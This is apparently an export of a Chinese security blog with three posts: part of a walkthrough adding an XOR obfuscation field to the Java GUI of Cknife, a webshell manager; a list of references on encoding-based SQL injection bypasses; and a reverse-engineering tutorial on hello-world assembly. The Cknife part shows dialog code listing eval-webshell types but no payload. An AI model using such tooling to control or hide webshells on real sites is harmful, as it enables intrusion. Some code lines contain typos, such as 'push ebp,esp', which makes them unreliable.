class="line">							<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">								MainFrame.tab.addPanel(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;);</span><br><span class="line">						</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;;</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">Thread</span>(run).start();</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.getSource() == about) &#123; <span class="comment">//如果是关于，则</span></span><br><span class="line">				<span class="type">AboutDialog</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AboutDialog</span>();</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.getSource() == config) <span class="comment">//如果是配置，则</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">ConfigDialog</span>();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><code>AddDialog()</code>就是我们要找的关键类了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AddDialog</span> <span class="keyword">extends</span> <span class="title class_">JDialog</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> String id,ip,time;</span><br><span class="line">	<span class="keyword">private</span> JButton button;</span><br><span class="line">	<span class="keyword">private</span> JTextField urltext, passtext, xortext;</span><br><span class="line">	<span class="keyword">private</span> JTextArea configtext;</span><br><span class="line">	<span class="keyword">private</span> JComboBox&lt;String&gt; atype, acode;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">AddDialog</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">super</span>(MainFrame.main, <span class="string">&quot;添加SHELL&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">		<span class="built_in">this</span>.setComponent();</span><br><span class="line">		<span class="built_in">this</span>.setEvent();</span><br><span class="line">		<span class="built_in">this</span>.setVisible(<span class="literal">true</span>); <span class="comment">// 模态对话框必须在添加完组件后设置可见，不然会显示不了。</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">AddDialog</span><span class="params">(String s)</span> &#123;</span><br><span class="line">		<span class="built_in">super</span>(MainFrame.main, <span class="string">&quot;修改SHELL&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">		String[] tmp = s.split(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">		<span class="built_in">this</span>.setComponent();</span><br><span class="line">		<span class="built_in">this</span>.setEvent();</span><br><span class="line">		<span class="built_in">this</span>.id = tmp[<span class="number">0</span>];</span><br><span class="line">		urltext.setText(tmp[<span class="number">1</span>]);</span><br><span class="line">		passtext.setText(tmp[<span class="number">2</span>]);</span><br><span class="line">		configtext.setText(tmp[<span class="number">3</span>]);</span><br><span class="line">		button.setText(<span class="string">&quot;编辑&quot;</span>);</span><br><span class="line">		atype.setSelectedItem(tmp[<span class="number">4</span>]);</span><br><span class="line">		acode.setSelectedItem(tmp[<span class="number">5</span>]);</span><br><span class="line">		<span class="built_in">this</span>.ip = tmp[<span class="number">6</span>];</span><br><span class="line">		<span class="built_in">this</span>.time = tmp[<span class="number">7</span>];</span><br><span class="line">		<span class="built_in">this</span>.setVisible(<span class="literal">true</span>); <span class="comment">// 模态对话框必须在添加完组件后设置可见，不然会显示不了。</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setComponent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        这里就是我们要找的了。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">		<span class="type">Toolkit</span> <span class="variable">t</span> <span class="operator">=</span> Toolkit.getDefaultToolkit();</span><br><span class="line">		<span class="type">Dimension</span> <span class="variable">d</span> <span class="operator">=</span> t.getScreenSize();</span><br><span class="line">		<span class="built_in">this</span>.setResizable(<span class="literal">false</span>);</span><br><span class="line">		<span class="built_in">this</span>.setSize(<span class="number">450</span>, <span class="number">240</span>);</span><br><span class="line">		<span class="built_in">this</span>.setLocation((d.width - <span class="built_in">this</span>.getWidth()) / <span class="number">2</span>,</span><br><span class="line">				(d.height - <span class="built_in">this</span>.getHeight()) / <span class="number">2</span>);</span><br><span class="line">		<span class="built_in">this</span>.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);</span><br><span class="line">		<span class="type">JPanel</span> <span class="variable">north</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();<span class="comment">//三个Jpanel对就于添加对话框的上、中、下有一个部分。</span></span><br><span class="line">		<span class="type">JPanel</span> <span class="variable">center</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">		<span class="type">JPanel</span> <span class="variable">south</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">		north.setLayout(<span class="keyword">new</span> <span class="title class_">FlowLayout</span>(FlowLayout.LEFT, <span class="number">3</span>, <span class="number">8</span>)); <span class="comment">//设置每个部分的layout类型</span></span><br><span class="line">		center.setLayout(<span class="keyword">new</span> <span class="title class_">FlowLayout</span>(FlowLayout.LEFT, <span class="number">3</span>, <span class="number">0</span>));</span><br><span class="line">		south.setLayout(<span class="keyword">new</span> <span class="title class_">FlowLayout</span>(FlowLayout.RIGHT, <span class="number">3</span>, <span class="number">8</span>));</span><br><span class="line">		<span class="type">JLabel</span> <span class="variable">urllabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;地址:&quot;</span>);</span><br><span class="line">		urllabel.setBorder(BorderFactory.createEmptyBorder(<span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		<span class="type">JLabel</span> <span class="variable">configlabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;配置:&quot;</span>);</span><br><span class="line">		configlabel.setBorder(BorderFactory.createEmptyBorder(<span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		<span class="type">JLabel</span> <span class="variable">actionlabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">		actionlabel.setBorder(BorderFactory.createEmptyBorder(<span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		urltext = <span class="keyword">new</span> <span class="title class_">JTextField</span>(<span class="string">&quot;http://&quot;</span>); <span class="comment">//Shell的地址</span></span><br><span class="line">		passtext = <span class="keyword">new</span> <span class="title class_">JTextField</span>(); <span class="comment">//连接密码</span></span><br><span class="line">		configtext = <span class="keyword">new</span> <span class="title class_">JTextArea</span>(); <span class="comment">//配置内容</span></span><br><span class="line">		<span class="type">JScrollPane</span> <span class="variable">configscroll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(configtext);</span><br><span class="line">		button = <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;添加&quot;</span>);</span><br><span class="line">		String[] strtype = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;脚本类型&quot;</span>, <span class="string">&quot;ASP(Eval)&quot;</span>, <span class="string">&quot;ASPX(Eval)&quot;</span>, <span class="string">&quot;PHP(Eval)&quot;</span>,</span><br><span class="line">				<span class="string">&quot;JSP(Eval)&quot;</span>, <span class="string">&quot;Customize&quot;</span> &#125;;</span><br><span class="line">		String[] strcode = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;字符编码&quot;</span>, <span class="string">&quot;GB2312&quot;</span>, <span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">				<span class="string">&quot;BIG5&quot;</span>, <span class="string">&quot;ISO-8859-1&quot;</span> &#125;;</span><br><span class="line">		atype = <span class="keyword">new</span> <span class="title class_">JComboBox</span>&lt;&gt;(strtype);</span><br><span class="line">		acode = <span class="keyword">new</span> <span class="title class_">JComboBox</span>&lt;&gt;(strcode);</span><br><span class="line">		urltext.setPreferredSize(<span class="keyword">new</span> <span class="title class_">Dimension</span>(<span class="number">320</span>,<span class="number">23</span>)); <span class="comment">//Shell地址输入框的大小</span></span><br><span class="line">		passtext.setPreferredSize(<span class="keyword">new</span> <span class="title class_">Dimension</span>(<span class="number">56</span>,<span class="number">23</span>)); <span class="comment">//连接密码输入框的大小</span></span><br><span class="line">		configtext.setLineWrap(<span class="literal">true</span>); <span class="comment">//配置框中内容自动换行</span></span><br><span class="line">		configtext.setPreferredSize(<span class="keyword">new</span> <span class="title class_">Dimension</span>(<span class="number">369</span>,<span class="number">128</span>));</span><br><span class="line">		configscroll.setBorder(urltext.getBorder());</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		下面是将各种控件添加到布局中，所以在这之前，我们要新建一个自己的控件，异或的话，用xor+输入框。逻辑部分后面再跟，先完成界面。</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="type">JLabel</span> <span class="variable">xorlabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;XOR:&quot;</span>);</span><br><span class="line">		xorlabel.setBorder(BorderFactory.createEmptyBorder(<span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">        xortext = <span class="keyword">new</span> <span class="title class_">JTextField</span>(); <span class="comment">//XOR密钥</span></span><br><span class="line">        xortextsetPreferredSize(<span class="keyword">new</span> <span class="title class_">Dimension</span>(<span class="number">56</span>,<span class="number">23</span>)); <span class="comment">//设置大小</span></span><br><span class="line">        north.add(urllabel); </span><br><span class="line">		north.add(urltext);</span><br><span class="line">		north.add(passtext);</span><br><span class="line">		center.add(configlabel);</span><br><span class="line">		center.add(configscroll);	</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * xor-related</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        south.add(xorlabel);</span><br><span class="line">        south.add(xortext);</span><br><span class="line">        </span><br><span class="line">		south.add(atype);</span><br><span class="line">		south.add(acode);</span><br><span class="line">		south.add(button);</span><br><span class="line">		south.add(actionlabel);</span><br><span class="line">		<span class="built_in">this</span>.getContentPane().add(north, BorderLayout.NORTH);</span><br><span class="line">		<span class="built_in">this</span>.getContentPane().add(center, BorderLayout.CENTER);</span><br><span class="line">		<span class="built_in">this</span>.getContentPane().add(south, BorderLayout.SOUTH);</span><br><span class="line">		<span class="built_in">this</span>.getRootPane().setDefaultButton(button);	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>别处先不管，来运行一下，看看效果：<br><img src="/images/pasted-6.png" alt="upload successful"></p>
<p>恩，说明咱们找对了。还有逻辑层的东西需要修改，不然只有功能没有实现。</p>
<p>我也不知道会分为几篇才能写完这个，最近时候比较紧，尽快吧。</p>
]]></content>
      <categories>
        <category>web-sec</category>
      </categories>
      <tags>
        <tag>web-sec</tag>
        <tag>java</tag>
        <tag>cknife</tag>
      </tags>
  </entry>
  <entry>
    <title>编码引起的SQL注入问题总结</title>
    <url>/sqli/%E7%BC%96%E7%A0%81%E5%BC%95%E8%B5%B7%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql">https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql</a><br><a href="https://www.erich-kachel.de/unicode-issues-on-php/">https://www.erich-kachel.de/unicode-issues-on-php/</a><br><a href="https://vigilance.fr/vulnerability/MySQL-SQL-injection-via-multi-byte-characters-5885">https://vigilance.fr/vulnerability/MySQL-SQL-injection-via-multi-byte-characters-5885</a><br><a href="http://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string">http://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string</a><br><a href="https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string/12118602#12118602">https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string/12118602#12118602</a></p>
<p><a href="http://eleves.ec-lille.fr/~couprieg/post/Bypass-addslashes-with-UTF-8-characters">http://eleves.ec-lille.fr/~couprieg/post/Bypass-addslashes-with-UTF-8-characters</a></p>
]]></content>
      <categories>
        <category>sqli</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程——HELLO WORLD!</title>
    <url>/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94HELLO%20WORLD!.html</url>
    <content><![CDATA[<blockquote>
<p>内容主要参考《RE4B》</p>
</blockquote>
<p>从今天开始，我们将学习《RE4B》这本书。这本书和汇编基础一起，将做为我们入门逆向工程的基础。</p>
<p>为了省去大家安装各种不同编译器的麻烦，我们将使用在线工具进行编译，地址如下：<br><a href="https://gcc.godbolt.org/" title="https://gcc.godbolt.org/">[https://gcc.godbolt.org/]</a></p>
<h2 id="HELLO-WORLD"><a href="#HELLO-WORLD" class="headerlink" title="HELLO WORLD"></a>HELLO WORLD</h2><p>现在，我们形如演示各种编程书中的最著名的程序：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;Hello, world!\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p>函数调用约定 1，后 面一条指令会把<code>EAX</code>的值当作返回值传递给调用者函数，而调用者函数(caller)会从EAX寄存器里取值， 把它当作返回结果。</p>
<h4 id="MSVC"><a href="#MSVC" class="headerlink" title="MSVC"></a>MSVC</h4><p>使用在线工具的MSVC编译器，我们可以得到下面的汇编指令结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">CONST   SEGMENT</span><br><span class="line">$SG5328 DB        &#x27;Hello, world!&#x27;, 0aH, 00H</span><br><span class="line">CONST   ENDS</span><br><span class="line">...</span><br><span class="line">$SG5328 DB        &#x27;Hello, world!&#x27;, 0aH, 00H</span><br><span class="line">EXTRN   ___acrt_iob_func:PROC</span><br><span class="line">EXTRN   ___stdio_common_vfprintf:PROC</span><br><span class="line">_TEXT   SEGMENT</span><br><span class="line">_main   PROC</span><br><span class="line">        push     ebp</span><br><span class="line">        mov      ebp, esp</span><br><span class="line">        push     OFFSET $SG5328</span><br><span class="line">        call     _printf</span><br><span class="line">        add      esp, 4</span><br><span class="line">        xor      eax, eax</span><br><span class="line">        pop      ebp</span><br><span class="line">        ret      0</span><br><span class="line">_main   ENDP</span><br><span class="line">_TEXT   ENDS</span><br></pre></td></tr></table></figure>
<p>汇编语言存在两种主流语体，即<code>Intel语体</code>和<code>AT&amp;T语体</code>。MSVC生成的汇编清单文件都采用了Intel语体。<br>在hello world这个例子中，我们可以看到结果中的代码中有<code>COST</code>和<code>_TEXT</code>段。它们分别代表<code>数据段</code>和<code>代码段</code>。C&#x2F;C++程序为字符串常量”hello, world!”分配了一个指针(cost char[])，只是在代码中这个指针的名称并不明显。然后，编译器自己进行了处理，并在内部把字符串常量命名为<code>$SG5328</code>。<br>因此，上述程序的源代码等效于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">const cahr *$SG5328[] = &quot;hello, world!\n&quot;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	printf($SG5328);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回顾编译结果，我们发现编译器在字符串常量的尾部添加了十六进制的数字<code>0</code>，即00h。依据C&#x2F;C++字符串的标准规范，编译器要为这个字符串常量添加<code>结束标志</code>（即数值为零的单个字节）。</p>
<p>在代码段<code>_TEXT</code>中，我们可以看到，函数体都有标志性的<code>函数序言（function prologue）</code>和<code>函数尾声（function epilogue）</code>。</p>
<h5 id="函数序言"><a href="#函数序言" class="headerlink" title="函数序言"></a>函数序言</h5><p>函数序言是函数在启动的时候运行的一系列指令。其汇编指令大致如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,X</span><br></pre></td></tr></table></figure>
<p>这些指令的功能是：在栈里保存EBP寄存器的内容，将ESP的值复制到EBP寄存器，然后修改栈的高度，以便为本函数的局部变量申请存储空间。<br>在函数执行期间，EBP寄存器不受函数运行的影响，它是函数访问<code>局部变量</code>和<code>函数参数</code>的基准值。虽然我们也使用ESP寄存器存储局部变量和运行参数，但是ESP寄存器的值总是会发生变化，使用起来并不方便。</p>
<h5 id="函数尾声"><a href="#函数尾声" class="headerlink" title="函数尾声"></a>函数尾声</h5><p>函数在退出时，要做启动过程的反操作，释放栈中申请的内存，还原EBP寄存器的值，将代码控制权还原给调用者函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret 0</span><br></pre></td></tr></table></figure>

<p>在函数序言标志后，我们能够看到调用<code>printf()</code>函数的指令<code>call _printf</code>。<br>通过PUSH指令，程序把字符串推送入栈。这样，printf()函数就可以调用栈里的指针，即字符串”hello, world!”的地址。<br>在printf()函数调用结束以后，程序的控制流会返回到main()函数之中。此时，字符串地址（即指针）仍残留在数据栈之中。这个时候就需要调整栈指针（ESP寄存器里的值）来释放这个指针。<br>下一条语句是<code>add esp,4</code>，把ESP寄存器（栈指针&#x2F;Stack Pointer）里的数值加<code>4</code>。<br>为什么要加上4呢？这是因为x86平台的内存地址使用<code>32位</code>(即4字节)数据描述。同理，在x64平台上释放这个指针时，就应该<code>add esp,8</code>。<br>因此，这条指令可以理解为<code>POP 某寄存器</code>。只是本例的指令直接舍弃了栈里的数据而POP指令还要把寄存器里的值存储到既定寄存器。</p>
<p>某些编译器（如Intel C++编译器）不会使用ADD指令来释放数据栈，它们可能会用<code>pop ecx</code>指令。例如，Oracle RDBMS（由Intel C++编译器编译）就会用POP ECX指令而不会用ADD指令。虽然POP ECX命令确实会修改ECX寄存器的值，但是它也同样释放了栈空间。<br>Intel C++编译器使用POP ECX指令另外一个理由就是，<code>pop ecx</code>对应的OPCODE(1字节)，比<code>add esp</code>的OPCODE(3字节)要短。</p>
<p>上述C&#x2F;C++程序里，printf()函数结束之后，main()函数会返回0（函数正常退出的返回码）。即main()函数的运算结果是0.<br>这个返回值是由指令<code>xor eax,eax</code>计算出来的。<br>顾名思义，<code>XOR</code>就是<code>异或</code>。编译器通常采用异或运算指令，而不会使用<code>mov eax,0</code>指令。主要是因为异或运算的OPCODE较短（2字节：5字节）。</p>
<p>也有一些编译器会使用<code>sub eax,eax</code>指令把EAX寄存器置零，其中SUB代表减法运算。</p>
<p>总之，main()函数的最后一项任务是使EAX的值为零。</p>
<p>汇编列表中最后的操作指令是<code>ret</code>，将控制权交给调用程序。通常它起到的作用就是将控制权交给操作系统，这部分功能由C&#x2F;C++编译器的CRT实现。</p>
<h4 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h4><p>接下来，我们使用GCC编译器来编译这个hello world程序。（书中的gcc版本为4.4.1），执行命令：<code>gcc 1.c -o 1</code></p>
<p>然后使用反汇编工具IDA查看main()函数的具体情况。IDA所输出的汇编指令格式，与MSVC生成的汇编指令格式相同，它们都采用Intel语体显示汇编指令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main		proc near</span><br><span class="line">var_c10		= dword ptr -10h</span><br><span class="line"></span><br><span class="line">			push ebp</span><br><span class="line">			push ebp,esp</span><br><span class="line">			and esp,0FFFFFFF0h</span><br><span class="line">			sub esp,10h</span><br><span class="line">			mov eax,offset aHelloWorld	;&quot;hello, world\n&quot;</span><br><span class="line">			mov [esp+10h+var_10],eax</span><br><span class="line">			call _printf</span><br><span class="line">			mov eax,0</span><br><span class="line">			leave</span><br><span class="line">			retn</span><br><span class="line">main		endp</span><br></pre></td></tr></table></figure>
<p>GCC生成的汇编指令，与MSVC生成的结果基本相同。它首先把”hello, world”字符串在数据段的地址（指针）存储到EAX寄存器里，然后再把它存储到数据栈里。<br>其中值得注意的是还有开场部分的<code>and esp,0fffffff0h</code>指令。它令栈地址（ESP的值）向16字节边界对齐（成为16的整数倍），属于初始化的指令。如果地址没有对齐，那么CPU可能需要访问再次内存才能获得栈内数据。虽然在8字节边界对齐就可以满足32位x86 CPU和64位x64 CPU的要求，但是主流编译器的编译规则规定<code>程序访问的地址必须向16字节对齐（被16整除）</code>。人们还是为了提高指令的执行效率而特意拟定了这条编译规范。</p>
<p><code>sub esp,10h</code>将在栈中分配<code>0x10 bytes</code>，即16字节。我们在后文看到，程序只会用到4字节空间。但是因为编译器对栈地址（ESP）进行了16字节对齐，所以每次都会分配16字节的空间。</p>
<p>而后，程序将字符串地址（指针的值）直接写入到数据栈。此处，GCC使用的是MOV指令；而MSVC生成的是PUSH指令。其中var_10是局部变量，用来向后面的printf()函数传递参数。</p>
<p>随即，程序调用printf()函数。<br>GCC和MSVC不同，除非人工指定优化选项，否则它会生成与源代码直接对应的<code>mov eax,0</code>指令。但是，我们已经知道MOV指令的OPCODE肯定要比XOR指令的OPCODE长。</p>
<p>最后一条<code>leave</code>指令，等效于<code>mov esp,ebp</code>和<code>pop ebp</code>两条指令。可见，这个指令调整了数据栈指针ESP，并将EBP的数值恢复到调用这个函数之前的初始状态。毕竟，程序段在开始部分就对EBP和ESP进行了操作，所以函数要在退出之前恢复这些寄存器的值。</p>
<h4 id="GCC-AT-amp-T语体"><a href="#GCC-AT-amp-T语体" class="headerlink" title="GCC:AT&amp;T语体"></a>GCC:AT&amp;T语体</h4><p>AT&amp;T语体同样是汇编语言的显示风格。这种语体在UNIX之中较为常见。</p>
<p>我们使用GCC4.7.3编译源程序并启用GCC编译选项<code>-fno-asynchronous-unwind-tables</code>，将会得到如下指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">		.string &quot;hello, world\n&quot;</span><br><span class="line">main:</span><br><span class="line">		pushl %ebp</span><br><span class="line">		movl %esp,%ebp</span><br><span class="line">		andl $-16,%esp</span><br><span class="line">		subl $16,%esp</span><br><span class="line">		movl $.LC0,(%esp)</span><br><span class="line">		call printf</span><br><span class="line">		movl $0,%eax</span><br><span class="line">		leave</span><br><span class="line">		ret</span><br></pre></td></tr></table></figure>

<h5 id="Intel语体和AT-amp-T语体的区别"><a href="#Intel语体和AT-amp-T语体的区别" class="headerlink" title="Intel语体和AT&amp;T语体的区别"></a>Intel语体和AT&amp;T语体的区别</h5><ol>
<li>运算表达式的书写顺序相反。</li>
<li>Intel 格式：&lt;指令&gt; &lt;目标&gt; &lt;源&gt;</li>
<li>AT&amp;T 格式：&lt;指令&gt; &lt;源&gt; &lt;目标&gt;<br>如果我们将Intel语体的指令认为是等号（&#x3D;）赋值，那么AT&amp;T语体结构使用的就是右箭头（-&gt;)进行赋值。部分C标准函数的运算单元的书写格式确实是相同的，例如memcpy()、strcpy()。</li>
<li>AT&amp;T语体中，在寄存器名称之前使用百分号（%）标记，在立即数之前使用美元符号（$）标记。AT&amp;T语体使用圆括号，而Intel语体使用方括号。</li>
<li>AT&amp;T语体里，每个运算操作符都需要声明操作数据的类型：<br>  -9：quad（64位）<br>  -l：指代32位long类型数据<br>  -w：指代16位word类型数据<br>  -b：指代8位byte类型数据</li>
</ol>
<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><h4 id="MSVC-x86-64"><a href="#MSVC-x86-64" class="headerlink" title="MSVC-x86-64"></a>MSVC-x86-64</h4><p>若用64位的MSVC编译上述程序，则会得到下述指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">CONST   SEGMENT</span><br><span class="line">$SG5328 DB        &#x27;Hello, world!&#x27;, 0aH, 00H</span><br><span class="line">CONST   ENDS</span><br><span class="line">...</span><br><span class="line">$SG5328 DB        &#x27;Hello, world!&#x27;, 0aH, 00H</span><br><span class="line">EXTRN   ___acrt_iob_func:PROC</span><br><span class="line">EXTRN   ___stdio_common_vfprintf:PROC</span><br><span class="line">_TEXT   SEGMENT</span><br><span class="line">_main   PROC</span><br><span class="line">			sub rsp,40</span><br><span class="line">			lea rcx,OFFSET FLAT:$SG5328</span><br><span class="line">			call printf</span><br><span class="line">			xor eax,eax</span><br><span class="line">			add rsp,40</span><br><span class="line">			ret 0</span><br><span class="line">_main   ENDP</span><br><span class="line">_TEXT   ENDS</span><br></pre></td></tr></table></figure>
<p>在x86-64框架的CPU里，所有的物理寄存器都被扩展为64位寄存器。程序可通过<code>R-</code>字头的名称直接调用整个64位寄存器。为了尽可能充分地利用寄存器、减少访问内存数据的次数，编译器会充分利用寄存器传递参数（fastcall约定）。也就是说，编译器会优先使用寄存器传递部分参数，再利用内存（数据栈）传递其余的参数。Win64的程序还会使用<code>RCX</code>、<code>RDX</code>、<code>R8</code>、<code>R9</code>这4个寄存器来存放函数参数。例如，printf()使用RCX寄存器传递参数，而没有像32位程序那样使用栈传递数据。</p>
<p>在x86-64硬件平台上，寄存器和指针都是64位的，存储于R-字头的寄存器里。但是出于兼容性的考虑，64位寄存器的低32位，也要能够担当32位寄存器的角色，才能运行32位程序。<br>在64位x86兼容的CPU中，RAX&#x2F;EAX&#x2F;AX&#x2F;AL的对应关系如下：<br><img src="/images/3a8a2259cfe25431d9f6fb47c0cff431d9c11ecf.png" alt="屏幕快照 2017-11-27 下午12.50.00.png"><br>main()函数的返回值是整数类型的零，但是出于兼容性和可移植性考虑，C语言的编译器仍将使用32位的零。换言之，即使是64位的应用程序，在程序结束时，EAX的值是零，而RAX不一定会是零。</p>
<p>此时，数据栈的对应空间里仍留有40字节的数据。这部分数据空间有个专有名词，即<code>阴影空间</code>。我们将在后面的课程中详细介绍。</p>
<h4 id="GCC-4-4-6-x64"><a href="#GCC-4-4-6-x64" class="headerlink" title="GCC 4.4.6 x64"></a>GCC 4.4.6 x64</h4><p>使用64位的Linux的GCC编译器编译上述程序，可得到如下指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.string &quot;hello, world\n&quot;</span><br><span class="line">main:</span><br><span class="line">		sub rsp,8</span><br><span class="line">		mov edi,OFFSET FLAT:.LC0	;&quot;hello, world&quot;</span><br><span class="line">		xor eax,eax		;number of vector registers passed</span><br><span class="line">		call printf</span><br><span class="line">		xor eax,eax</span><br><span class="line">		add rsp,8</span><br><span class="line">		ret</span><br></pre></td></tr></table></figure>
<p>Linux&#x2F;BSD&#x2F;Max OSX 系统中的应用程序，会优先使用<code>RDI</code>、<code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code>、<code>R9</code>这6个寄存器传递函数所需的头6个参数，然后使用数据栈传递其余的参数。<br>因此，64位的GCC编译器使用EDI寄存器（寄存器的32位）存储字符串指针。EDI不过是RDI寄存器中地址位较低的32位地址部分。<br>为何GCC不直接使用整个RDI寄存器呢？<br>这是因为，64位汇编指令MOV在写入R-寄存器的低32位地址位的时候，即对E-寄存器进行写操作的时候，会同时清除R-寄存器中的高32位地址位。所以，<code>MOV EAX,011223344H</code>能够对RAX寄存器进行正确的赋值操作，因为该指令会清除（清零）高地址位的内容。这种操作是出于空间方面的考虑，GCC进行的优化。</p>
<p>在调用printf()之前，程序清空了EAX寄存器，这是x86-64框架的系统规范决定的。在系统与应用程序接口规范中，EAX寄存器用来保存用过的<code>向量寄存器(VECTOR REGISTERS)</code>。</p>
<h3 id="GCC的其他特性"><a href="#GCC的其他特性" class="headerlink" title="GCC的其他特性"></a>GCC的其他特性</h3><p>只要C语言代码里使用了字符串常量，编译器就会把这个字符串常量置于常量字段，以保证其内容不会发生变化。不过GCC有个有趣的特征：它可能会把字符串拆出来单独使用。<br>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int f1()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;world\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int f2()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;hello world\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	f1();</span><br><span class="line">	f2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>多数的C&#x2F;C++编译器（包括MSVC编译器）会分配出两个直接对应的字符串，不过GCC 4.8.1的编译结果则更为可圈可点：</p>
